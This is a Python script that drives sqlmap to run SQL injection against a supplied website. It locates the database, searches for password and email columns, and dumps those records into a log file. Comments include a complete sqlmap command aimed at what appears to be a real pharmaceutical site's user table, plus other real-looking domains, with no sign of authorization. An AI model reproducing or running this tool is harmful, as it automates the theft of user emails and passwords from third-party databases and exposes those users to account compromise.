#!/usr/bin/python

import io
import os
import subprocess
import sys

SQLMAP_PATH = './sqlmap.py'
OUTPUT_DIR = './'
LOG_FILE = './'

def die(msg):
    print('Error: %s' % msg)
    exit(1)

def free_subprocess(p):
    try:
        p.kill()
    except:
        pass
    p.wait()
    print(p.returncode)                        
    if p.returncode != 0:
        exit(p.returncode)

def print_cmd(cmd_arr):
    cmd = ' '.join(cmd_arr)
    print('cmd is: %s' % cmd)

def get_db_name(url, post_data):
    cmd = ['python', SQLMAP_PATH, '-u', url, post_data, '--current-db', '--batch',
           '--answers', 'do you want to dump entries?=N',
           '--crawl=1', '--forms', '--smart', '--technique=E',
           '--output-dir=%s' % OUTPUT_DIR]
    print_cmd(cmd)
    p = subprocess.Popen(cmd, stdout = subprocess.PIPE, stdin = subprocess.PIPE,
                         stderr = subprocess.PIPE)
    try:
        p.stdin.write(b'\n' * 20)
    except:
        pass
    print(p.stderr.readline().decode())
    db_name = None
    while True:
        line = p.stdout.readline().decode('utf-8') # www.ipet.re.kr
        if line == '':
            free_subprocess(p);
            break
        if line.find('current database:') != -1:
            start = line.find('\'')
            end = line.rfind('\'')
            if start == -1 or end == -1 or start == end:
                print(line)
                die('Could not retrieve current db')
            db_name = line[start + 1 : end]
            free_subprocess(p);
            file_path = OUTPUT_DIR + url + '/target.txt'
            print(file_path)
            f = open(file_path)
            content = f.read().strip().split('\n')
            content = [c.strip() for c in content if len(c.strip()) > 0]
            url = content[0].split(' ')[0]
            post_data = ''
            if len(content) > 1:
                post_data = content[1]
            return db_name, url, post_data
    return None, None, None


def parse_password_table(table_str):
    table_str = table_str.strip()
    l = table_str.split('\n')[1:]
#    print(table_str)
#    print(l)
    table1 = l[0].split(' ')
    if len(table1) < 2:
        return None
    table = table1[1] # www.abcdeluta.org.br
    l = l[5:-1]
    result = {
        'table_name': table
    }
    columns = []
    print(l)
    for line in l:
        line = line.split('|')
        if len(line) <= 1:
            continue
        column_name = line[1].strip()
        columns.append(column_name)
    result['columns'] = columns
    return result

def get_password_tables(url, post_data, db_name):
    cmd = ['python', SQLMAP_PATH, '-u', url, post_data,
           " to separate words&biaoname=wz_en&nr=All",
           '--technique=E', '--smart',
           '-D',
           db_name, '--search', '-C', 'password', '--batch',
           '--answers', 'do you want to dump entries?=N',
           '--output-dir=%s' % OUTPUT_DIR]
    print_cmd(cmd)
    p = subprocess.Popen(cmd,
                         stdout = subprocess.PIPE, stdin = subprocess.PIPE)
    p.stdin.write(b'\n' * 20)        
    stdout, stderr = p.communicate()
    stdout = stdout.decode()
    l = stdout.split('\n')
    res = []
    start_str = 'found in the following databases:'
    start_ind = stdout.find(start_str)
    if start_ind == -1:
        die('No passwords found')
    stdout = stdout[start_ind + len(start_str):]
    end_str = 'do you want to dump entries?'
    end_ind = stdout.find(end_str)
    if end_ind == -1:
        die('Invalid output')
    stdout = stdout[:end_ind].strip()

    l = stdout.split('Database:')
    tables = []
    for item in l:
        if len(item) == 0:
            continue
        table = parse_password_table(item)
        if table:
            tables.append(table)
    free_subprocess(p);

    return tables

def get_email_columns(url, post_data, db_name, table_name):
    print('get email columns: %s %s %s' % (url, db_name, table_name))
    cmd = ['python', SQLMAP_PATH, '-u', url, post_data, '-D',
           db_name, '-T', table_name, '--search', '-C', 'email',
           '--technique=E', '--smart',
           '--batch', '--answers', 'do you want to dump entries?=N',
           '--output-dir=%s' % OUTPUT_DIR]
    print_cmd(cmd)
    p = subprocess.Popen(cmd, stdout = subprocess.PIPE, stdin = subprocess.PIPE)
    print('pid is: %s' % p.pid)
    p.stdin.write(b'\n' * 20)
    stdout, stderr = p.communicate()
    free_subprocess(p);
    
    stdout = stdout.decode()
    l = stdout.split('\n')
    res = []
    start_str = 'found in the following databases:'
    start_ind = stdout.find(start_str)
    if start_ind == -1:
        return []
    stdout = stdout[start_ind + len(start_str):]
    end_str = 'do you want to dump entries'
    end_ind = stdout.find(end_str)
    if end_ind == -1:
        return []
    stdout = stdout[:end_ind].strip()
    print(stdout)    
    l = stdout.split('\n')[6:-1]
    for line in l:
        line = line.strip()
        t = line.split('|')
        if len(t) != 4:
            continue
        column_name = line.split('|')[1].strip()
        res.append(column_name)
    return res


# ./sqlmap.py -u "http://www.pharmachinaonline.com:80/js/search_fen.asp" --data="about=use "," to separate words&biaoname=wz_en&nr=All" --current-db -D fzprarcq_pharma -T dbo.FP_User -C UserEmail,UserPassword --dump

def get_num_entries_in_table(url, post_data, db_name, table_name, columns):
    print('getting num entries in table: %s' % (table_name))
    columns_str = ','.join(columns)
    arr = ['python', SQLMAP_PATH, '-u', url, post_data, '-D', db_name,
           '-T', table_name, '-C', columns_str, '--count',
           '--technique=E', '--smart',
           '--answers', 'do you want to dump entries?=N',
           '--output-dir=%s' % OUTPUT_DIR]
    print_cmd(arr)
    p = subprocess.Popen(arr,
                         stdout = subprocess.PIPE,
                         stdin = subprocess.PIPE)
    p.stdin.write(b'\n' * 20)
    stdout, stderr = p.communicate()
    free_subprocess(p);
    stdout = stdout.decode()
    start_ind = stdout.find('Database: ')
    if start_ind == -1:
        die('Invalid output')
    stdout = stdout[start_ind:]
    l = stdout.split('\n')
    #print(l)
    item = l[4]
    l = item.split('|')
    n = int(l[2].strip())
    print('Number of entries in table: %s are %s' % (l[1].strip(), l[2].strip()))
    return n
    

def dump_table(url, post_data, db_name, table_name, columns):
    n = get_num_entries_in_table(url, post_data, db_name, table_name, columns)
    print('Dumping table: %s. columns: %s' % (table_name, columns))
    string = ''
    for column in columns:
        string += column + ' '
    print(string)
    columns_str = ','.join(columns)
    start = n / 2 + 1
    end = start + 3
    #post_data = '"%s"' % post_data
    arr = ['python', SQLMAP_PATH, '-u', url, post_data, '-D', db_name,
           '--technique=E', '--smart',
           '-T', table_name, '-C', columns_str, '--dump',
           '--answers=do you want to=N',
           '--start=%d' % start, '--stop=%d' % end,
           '--output-dir=%s' % OUTPUT_DIR]
    print_cmd(arr)
    p = subprocess.Popen(arr,
                         stdout = subprocess.PIPE,
                         stdin = subprocess.PIPE)
    print(p.pid)
    print('eminem')
    content = io.open('/proc/%s/cmdline' % p.pid, mode='r', encoding='utf8').read()
    print(content)
    #p.stdin.write(b'\n' * 20)

    stdout, stderr = p.communicate()
    free_subprocess(p);    
    stdout = stdout.decode('utf-8')
    start_ind = stdout.find('dumped to CSV file ')
    if start_ind == -1:
        print('_________________________________')
        print(stdout)
        print('probably invalid output')
        return;
    print('eminem')
    stdout = stdout[start_ind:]
    end_ind = stdout.find('\n')
    if end_ind == -1:
        die('invalid output1')
    stdout = stdout[:end_ind].strip()
    path = stdout.split('\'')[1]
    print('path is: %s' % path)
    content = io.open(path, mode='r', encoding='utf8').read()
    log = io.open(LOG_FILE, mode='a', encoding='utf8')
    log.write(u'db: %s\n' % db_name);
    log.write(u'entries: %s\n' % n);
    log.write(u'table: %s\n' % table_name);
    s = '';
    for column in columns:
        s += column
        s += ' '
    log.write(u'columns: %s\n' % s);
    log.write(content)
    log.close()    
    #print(stdout)
    print(path)
    print('logged to %s', LOG_FILE)


def clear_dir(path):
    for the_file in os.listdir(path):
        file_path = os.path.join(path, the_file)
        try:
            if os.path.isfile(file_path):
                os.unlink(file_path)
                #elif os.path.isdir(file_path): shutil.rmtree(file_path)
        except Exception as e:
            print(e)

# --current-db -D fzprarcq_pharma --search -C password    
def main(url, post_data):
    print('Program started. Now trying to get database name..')
    old_url = url
    db_name, url, post_data = get_db_name(url, post_data)
    print('DB name is: %s' % db_name)
    print('url: %s' % url)
    print('post data: %s' % post_data)
    if not db_name:
        die('Could not get the DB name')
    path = os.path.join(OUTPUT_DIR, old_url, 'dump', db_name)
    print(path)
    try:
        clear_dir(path)
    except:
        pass
    post_data = '--data=%s' % post_data
    print('Now getting tables with password field in them')
    tables = get_password_tables(url, post_data, db_name)
    print(tables)
    print('Now getting email columns..')
    tables_to_dump = []
    for table in tables:
        columns = get_email_columns(url, post_data, db_name, table['table_name'])
        if len(columns) == 0:
            continue
        print(columns)
        for column in columns:
            table['columns'].insert(0, column)
        tables_to_dump.append(table)
    print('Done')
    print(tables_to_dump)
    for table in tables_to_dump:
        dump_table(url, post_data, db_name, table['table_name'], table['columns'])
        print('*' * 80)


if __name__ == '__main__':
    if len(sys.argv) < 4:
        print('Usage: python3 %s url sqlmap_path output_dir log_file' % sys.argv[0])
        exit(0);
    url = sys.argv[1]
    SQLMAP_PATH = sys.argv[2]
    OUTPUT_DIR = sys.argv[3]
    OUTPUT_DIR = os.path.abspath(OUTPUT_DIR)
    if OUTPUT_DIR[-1] != '/':
        OUTPUT_DIR += '/'
    LOG_FILE = os.path.abspath(sys.argv[4])        
    main(url, '')



